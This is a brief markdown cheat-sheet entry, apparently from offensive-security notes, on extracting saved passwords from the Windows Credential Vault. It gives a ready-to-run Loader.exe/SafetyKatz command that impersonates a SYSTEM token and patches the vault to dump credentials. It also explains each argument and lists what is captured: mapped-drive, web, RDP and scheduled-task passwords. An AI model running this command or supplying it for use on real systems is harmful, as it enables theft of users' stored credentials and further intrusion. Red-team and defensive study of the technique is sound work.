# Windows Credential Vault

Extract stored credentials (Windows Credential Manager) from memory using Mimikatz/SafetyKatz.

## Dump Credential Vault
Requires elevated (SYSTEM or high-integrity admin) context:
```
Loader.exe -path SafetyKatz.exe -args "token::evasive-elevate" "vault::cred /patch" "exit"
```
- `token::evasive-elevate` — impersonates SYSTEM token
- `vault::cred /patch` — patches and reads Windows Credential Vault entries

## What It Captures
- Saved network credentials (mapped drives, servers)
- Web credentials stored in Credential Manager
- RDP saved passwords
- Scheduled task credentials

## Notes
- Credentials stored per-user; run as target user for their vault
- `vault::list` shows available vaults without patching
- Alternative: `cmdkey /list` shows stored credentials without extracting passwords
